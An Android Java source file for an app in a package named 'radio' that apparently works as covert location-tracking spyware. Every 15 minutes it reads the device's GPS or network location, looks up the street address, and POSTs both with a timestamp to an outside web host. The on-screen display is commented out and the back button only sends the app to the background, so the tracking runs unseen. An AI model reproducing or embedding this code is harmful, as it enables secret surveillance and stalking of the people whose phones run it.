package com.simple.one.radio;

import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.provider.Settings;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.RelativeLayout;
import android.widget.Toast;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.TimeZone;
import java.util.Timer;
import java.util.TimerTask;

import static android.R.attr.value;


public class MainActivity extends AppCompatActivity {
    Geocoder geocoder = new Geocoder(this, Locale.getDefault());
    Setting mSetting = new Setting();
    ListView mainListView;
    ArrayAdapter<String> listAdapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        /* Init array list view */
        mainListView = (ListView) findViewById(R.id.mainListView);
        mSetting.data_array = new ArrayList<String>();
        mSetting.adapter = new ArrayAdapter<String>(this,R.layout.item, mSetting.data_array);

        mSetting.locationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);

        mSetting.doJob(this, 15);

    }

    @Override
    public void onBackPressed() {
        moveTaskToBack(true);
    }

    private class MyPost extends AsyncTask<Void,Void,Void> {

        @Override
        protected Void doInBackground(Void... arg0) {
            // TODO Auto-generated method stub
            // Create a new HttpClient and Post Header
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("http://luutruthongtinn.000webhostapp.com/test.php");

            try {
                // Add your data
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
                nameValuePairs.add(new BasicNameValuePair("android_location", mSetting.Location));
                nameValuePairs.add(new BasicNameValuePair("android_address", mSetting.Address));
                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                // Execute HTTP Post Request
                HttpResponse response = httpclient.execute(httppost);
                Log.v("Post Status","Code: "+response.getStatusLine().getStatusCode());
            } catch (ClientProtocolException e) {
                // TODO Auto-generated catch block
            } catch (IOException e) {
                // TODO Auto-generated catch block
            }
            return null;
        }

    }

    public void RunTask(){
        //Put function wants to run periodly here
        if(mSetting.checkGPS_setting()){
            GPSUpdate();
        }
        else{
            NetworkUpdate();
        }
        new MyPost().execute();
    }

    public void GPSUpdate() {
        if(!mSetting.checkLocation())
            return;

        if(mSetting.button_GPS) {
            mSetting.button_GPS = false;
            mSetting.locationManager.removeUpdates(locationListenerGPS);
        }
        else {
            mSetting.button_GPS = true;
            mSetting.locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 2 * 60 * 1000, 10, locationListenerGPS);
        }
    }

    public void NetworkUpdate() {
        if(!mSetting.checkLocation())
            return;

        mSetting.locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,
                60 * 1000, 10, locationListenerNetwork);
    }

    private final LocationListener locationListenerNetwork = new LocationListener() {
        public void onLocationChanged(Location location) {
            mSetting.Longtitude = location.getLongitude();
            mSetting.Latitude = location.getLatitude();

            //runOnUiThread(new Runnable() {
                //@Override
                //public void run() {
                    //Toast.makeText(MainActivity.this, "Network Provider update", Toast.LENGTH_SHORT).show();
                    //Toast.makeText(MainActivity.this, "GPS " + mSetting.Longtitude + "," + mSetting.Latitude, Toast.LENGTH_SHORT).show();
                    try {
                        //Add to list
                        mSetting.addresses = geocoder.getFromLocation(mSetting.Latitude, mSetting.Longtitude, 1);
                        String tmp = String.valueOf(mSetting.Longtitude) + ",";
                        tmp += mSetting.Latitude + " : ";
                        tmp += mSetting.addresses.get(0).getAddressLine(0) + " - ";
                        tmp += mSetting.get_current_time();
                        //mSetting.add_to_list(tmp);
                        //Set variable
                        mSetting.Location = tmp;
                        mSetting.Address = mSetting.addresses.get(0).getAddressLine(0);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    mSetting.locationManager.removeUpdates(locationListenerNetwork);
                //}
            //});
        }

        @Override
        public void onStatusChanged(String s, int i, Bundle bundle) {}
        @Override
        public void onProviderEnabled(String s) {}
        @Override
        public void onProviderDisabled(String s) {}
    };

    private final LocationListener locationListenerGPS = new LocationListener() {
        public void onLocationChanged(Location location) {
            mSetting.Longtitude = location.getLongitude();
            mSetting.Latitude = location.getLatitude();

            //runOnUiThread(new Runnable() {
                //@Override
                //public void run() {
                    //Toast.makeText(MainActivity.this, "GPS Provider update", Toast.LENGTH_SHORT).show();
                    ///Toast.makeText(MainActivity.this, "GPS " + mSetting.Longtitude + "," + mSetting.Latitude,
                    //               Toast.LENGTH_SHORT).show();
                    try {
                        mSetting.addresses = geocoder.getFromLocation(mSetting.Latitude, mSetting.Longtitude, 1);
                        String tmp = String.valueOf(mSetting.Longtitude) + ",";
                        tmp += mSetting.Latitude + " : ";
                        tmp += mSetting.addresses.get(0).getAddressLine(0) + " - ";
                        tmp += mSetting.get_current_time();
                        //mSetting.add_to_list(tmp);
                        //Set variable
                        mSetting.Location = tmp;
                        mSetting.Address = mSetting.addresses.get(0).getAddressLine(0);

                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                //}
            //});
        }

        @Override
        public void onStatusChanged(String s, int i, Bundle bundle) {}
        @Override
        public void onProviderEnabled(String s) {}
        @Override
        public void onProviderDisabled(String s) {}
    };

    class Setting{
        Context mContext;

        public boolean button_GPS = false;
        public boolean button_Network = false;

        public double timer = 0;
        public double Latitude = 0;
        public double Longtitude = 0;

        public ArrayList<String> data_array;
        public ArrayAdapter adapter;
        public List<Address> addresses;

        public LocationManager locationManager;

        public String Location = null;
        public String Address = null;

        private boolean isLocationEnabled() {
            return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                    locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        }

        private boolean checkLocation() {
            if(!isLocationEnabled())
                showAlert();
            return isLocationEnabled();
        }

        private void showAlert() {
            final AlertDialog.Builder dialog = new AlertDialog.Builder(mContext);
            dialog.setTitle("Enable Location")
                    .setMessage("Your Locations Settings is set to 'Off'.\nPlease Enable Location to " +
                            "use this app")
                    .setPositiveButton("Location Settings", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface paramDialogInterface, int paramInt) {
                            Intent myIntent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                            startActivity(myIntent);
                        }
                    })
                    .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface paramDialogInterface, int paramInt) {
                        }
                    });
            dialog.show();
        }

        public void add_to_list(String data){
            data_array.add(data);
            mainListView.setAdapter(adapter);
            mSetting.adapter.notifyDataSetChanged();
        }

        public String get_current_time(){
            Calendar cal = Calendar.getInstance(TimeZone.getTimeZone("GMT+7:00"));
            Date currentLocalTime = cal.getTime();
            DateFormat date = new SimpleDateFormat("HH:mm a");
            date.setTimeZone(TimeZone.getTimeZone("GMT+7:00"));

            String localTime = date.format(currentLocalTime);

            return localTime;
        }
        public void doJob(final MainActivity main, final long minute) {
            Timer T = new Timer();
            T.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            mSetting.timer++;
                            if (mSetting.timer >= minute) {
                                main.RunTask();
                                mSetting.timer = 0;
                            }
                        }
                    });
                }
            }, 1000, 60000);  /* Delay in first run, period */
        }

        public  boolean checkGPS_setting(){
            LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE );
            boolean statusOfGPS = manager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            if(!statusOfGPS) {
                return true;
            }
            return false;
        }
    } // End of Class
}
